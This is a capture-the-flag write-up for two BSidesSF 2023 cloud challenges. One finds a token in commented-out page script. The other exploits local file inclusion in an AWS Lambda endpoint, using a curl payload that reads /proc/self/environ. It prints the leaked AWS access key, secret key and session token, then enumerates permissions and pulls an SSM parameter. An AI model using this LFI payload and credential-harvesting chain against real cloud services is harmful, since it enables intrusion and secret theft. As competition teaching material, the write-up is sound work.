# BSidesSF

Below are two writeups for the Cloud Hacking CTF at BSidesSF 2023.

## [Easy] Tony Tony Tony
```
Tony is a web application developer intern in a Product Based Company. Recently Tony was assigned to create a web app which can accept the codebase and gist URL as the parameter and save in the gallery. He has developed the API on AWS platform using which the end user can save the codebase from the remote URL.

Start here - http://65.0.191.38/
``` 

This one is pretty classic, open the webpage, inspect the page, and you get the flag. Here is an excerpt of the page:
```
...abbreviated...
    <script>
      // Add your JavaScript code here
      /*
      var codeEditor = CodeMirror.fromTextArea(document.getElementById("code"), {
        lineNumbers: true,
        mode: "javascript",
        theme: "default"
      });

      var myHeaders = new Headers();
        myHeaders.append("authorizationToken", "flag-{gtkO4f4NOrJsRRNZWxiTbL6LLUs5Ir8g}");
        myHeaders.append("Content-Type", "application/json");

        var raw = JSON.stringify({
          "codeFile": code
        });

        var requestOptions = {
          method: 'POST',
          headers: myHeaders,
          body: raw,
          redirect: 'follow'
        };

        fetch("https://jg0rh6th8e.execute-api.ap-south-1.amazonaws.com/test/share", requestOptions)
          .then(response => response.text())
          .then(result => {
            var resultDiv = document.getElementById("result");
            resultDiv.innerHTML = "";

            var pre = document.createElement("pre");
            pre.innerText = result;
            resultDiv.appendChild(pre);
          })
          .catch(error => console.log('error', error));
          */
    </script>
...abbreviated...
```

## [Medium] Sharing is Caring (the sequel)
```
Previously you enumerated the all policies attached to the assumed role. Now try to access the resources using the policies attached to the role and during this process you will find the flag for this challenge.

Can you get that flag to us please?
```
So there were two Sharing is Caring challenges, the first one and then this one, `the sequel`. Well, we got the second one first and never go the first one.

To solve this one, we authenticated with the credentials we pulled from the first challenge, to the API endpoint listed in the code:
![web1](img/web1.png)

Then, we tried with a number to find that the api is expecting the text "codeFile":
![web2](img/web2.png)

Then, we found that it can take a file prefix in the JSON:
![web3](img/web3.png)

This is local file inclusion!
![web4](img/web4.png)

After we determined we had LFI on this endpoint, we grabbed the `/proc/self/environ` file in order to pull AWS credentials from the host (the sed line is some parsing to make this look nicer):
```
$ curl -H "authorizationToken:flag-{gtkO4f4NOrJsRRNZWxiTbL6LLUs5Ir8g}" -d "{\"codeFile\": \"file:///proc/self/environ\"}"  https://jg0rh6th8e.execute-api.ap-south-1.amazonaws.com/test/share | sed 's/\\x00/\n/g'

{"statusCode": 200, "body": "b'_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129\
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand\
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001\
AWS_REGION=ap-south-1\
_AWS_XRAY_DAEMON_PORT=2000\
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR\
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\
LANG=en_US.UTF-8\
AWS_ACCESS_KEY_ID=ASIAYX67JAH5LRCX6MMA\
LAMBDA_TASK_ROOT=/var/task\
TZ=:UTC\
AWS_DEFAULT_REGION=ap-south-1\
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000\
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEOf//////////wEaCmFwLXNvdXRoLTEiSDBGAiEAs3Pwa2PMrmOXz50kGPQTwzRLVZ5TNP5boZyD0UK99LsCIQDmpMXfRGa1d0UTdvSWuo3dsoYELm6QZvCD4Vujr8kjjyr4Agjg//////////8BEAAaDDYwMTIyNjgwNTc1NCIMfGxrJszwxvrexpwQKswCyS6xNmJwIDcivuMgZgiJGEljIh9VGaLQQ7N/YzCCep0DPjXg7uld/uEO1s/W4idf45tYL1fj0oIIR/7cUI30HmTSpBOaIud4V5ykooAGWYjZDtruzdH1tKyBc1dFXvlucGWn7YpwdECFw8kQCAFVRhCylOAo3Yopl70ZaVEQYxM3Ng9/O1s+xpy8yjLscOHjWSp53CI2EdjIMXpPxggmxKoYd6A748MGe5wJ/Di1W3klw7iHWptMyas28b3ebqXiRrsYJSfPxVw4i/74W/w0Ndf72cp7hpUvo2A2M+BS4N55FRk3VcWFVt5P/XstGv3qWNM1i4JJpm8yBFGJXIblv7wp306RsZMvIkzkT8cgNzOrtLIaqWjurLSHSWdP5xaAgYe3RXeaeA60Vws/kMChUsvlW4mxpsguQ0HyBQ8XhLOaqkkoWGaksQrwa58wtu6WogY6nQHJ6zQWdnEcAYgR6k3KgEcbR7w2K6zqVL9C1DpG3cPVSHXy1RDeByTO1+oiwgTeUlXWAnWvRCogfF1f/5sp3zyFNDlQ00mD7lCkNYJIJidFURgHjtNQa16yy8i8SJ5cT8XROmNqU/e8NlGlBk1xz5WcO8sUZ+9r3EwabIqX1au3rncd3ZvNzhi8yqJ7mIUCY2cspWya8+6MbPhzWe4f\
AWS_LAMBDA_LOG_STREAM_NAME=2023/04/23/[$LATEST]172b1145e8774dd38110cf200ee6f07e\
LAMBDA_RUNTIME_DIR=/var/runtime\
_HANDLER=lambda_function.lambda_handler\
AWS_LAMBDA_FUNCTION_NAME=ShareCodeFile\
AWS_SECRET_ACCESS_KEY=zxtaRg1pgtrwW6L9/27d4mPkxp7sYlgYn88Flbdw\
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/ShareCodeFile\
AWS_EXECUTION_ENV=AWS_Lambda_rapid\
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128\
AWS_LAMBDA_FUNCTION_VERSION=$LATEST\
'"}%
```

These are the things we really care about, especially the AWS credentials:
```
AWS_REGION=ap-south-1
AWS_ACCESS_KEY_ID=ASIAYX67JAH5LRCX6MMA
AWS_DEFAULT_REGION=ap-south-1
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEOf//////////wEaCmFwLXNvdXRoLTEiSDBGAiEAs3Pwa2PMrmOXz50kGPQTwzRLVZ5TNP5boZyD0UK99LsCIQDmpMXfRGa1d0UTdvSWuo3dsoYELm6QZvCD4Vujr8kjjyr4Agjg//////////8BEAAaDDYwMTIyNjgwNTc1NCIMfGxrJszwxvrexpwQKswCyS6xNmJwIDcivuMgZgiJGEljIh9VGaLQQ7N/YzCCep0DPjXg7uld/uEO1s/W4idf45tYL1fj0oIIR/7cUI30HmTSpBOaIud4V5ykooAGWYjZDtruzdH1tKyBc1dFXvlucGWn7YpwdECFw8kQCAFVRhCylOAo3Yopl70ZaVEQYxM3Ng9/O1s+xpy8yjLscOHjWSp53CI2EdjIMXpPxggmxKoYd6A748MGe5wJ/Di1W3klw7iHWptMyas28b3ebqXiRrsYJSfPxVw4i/74W/w0Ndf72cp7hpUvo2A2M+BS4N55FRk3VcWFVt5P/XstGv3qWNM1i4JJpm8yBFGJXIblv7wp306RsZMvIkzkT8cgNzOrtLIaqWjurLSHSWdP5xaAgYe3RXeaeA60Vws/kMChUsvlW4mxpsguQ0HyBQ8XhLOaqkkoWGaksQrwa58wtu6WogY6nQHJ6zQWdnEcAYgR6k3KgEcbR7w2K6zqVL9C1DpG3cPVSHXy1RDeByTO1+oiwgTeUlXWAnWvRCogfF1f/5sp3zyFNDlQ00mD7lCkNYJIJidFURgHjtNQa16yy8i8SJ5cT8XROmNqU/e8NlGlBk1xz5WcO8sUZ+9r3EwabIqX1au3rncd3ZvNzhi8yqJ7mIUCY2cspWya8+6MbPhzWe4f
AWS_SECRET_ACCESS_KEY=zxtaRg1pgtrwW6L9/27d4mPkxp7sYlgYn88Flbdw
```

Once we have these AWS credentials, we can use a bash script to enumerate our privileges within this environment:

```
# https://github.com/carlospolop/bf-aws-permissions
$ bash bf-aws-permissions.sh -p default -r ap-south-1
Entity Type: role
Entity Name: ShareCodeFile-role-sbutfhkq
Attached Policies
...abbreviated...
=====================

Inline Policies
SSMParametersLISTREAD
ZmxhZy17a0drMTlzQmN3TlJua2FyWkZLYW1vS1E0TzZzQzRpSjF9
=====================

  Policy Name: SSMParametersLISTREAD
  Policy Document:
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "VisualEditor0",
      "Effect": "Allow",
      "Action": [
        "ssm:GetParametersByPath",
        "ssm:GetParameters",
        "ssm:GetParameter"
      ],
      "Resource": "arn:aws:ssm:*:601226805754:parameter/*"
    },
    {
      "Sid": "VisualEditor1",
      "Effect": "Allow",
      "Action": "ssm:DescribeParameters",
      "Resource": "*"
    }
  ]
}
---------------------
...abbreviated...
```

This gives us the privs to use `aws ssm describe-parameters` and `aws ssm get-parameter`. So first, we used `aws ssm describe-parameters`:

```
$ aws ssm describe-parameters --profile old --region ap-south-1
{
    "Parameters": [
        {
            "Name": "/envcodeshare/test/flag",
            "Type": "String",
            "LastModifiedDate": 1681201141.981,
            "LastModifiedUser": "arn:aws:iam::601226805754:user/satyam",
            "Description": "This is the Final Flag",
            "Version": 2,
            "Tier": "Standard",
            "Policies": [],
            "DataType": "text"
        }
    ]
}
```

From here, we saw it was `"Type": "String"`, so we got the parameter:

```
$ aws ssm get-parameter --profile old --region ap-south-1 --name /envcodeshare/test/flag
{
    "Parameter": {
        "Name": "/envcodeshare/test/flag",
        "Type": "String",
        "Value": "flag-{fUg3jZueA4J1u7nEVNqLFVASEZcyYjR0}",
        "Version": 2,
        "LastModifiedDate": 1681201141.981,
        "ARN": "arn:aws:ssm:ap-south-1:601226805754:parameter/envcodeshare/test/flag",
        "DataType": "text"
    }
}
```

And we got the flag :).

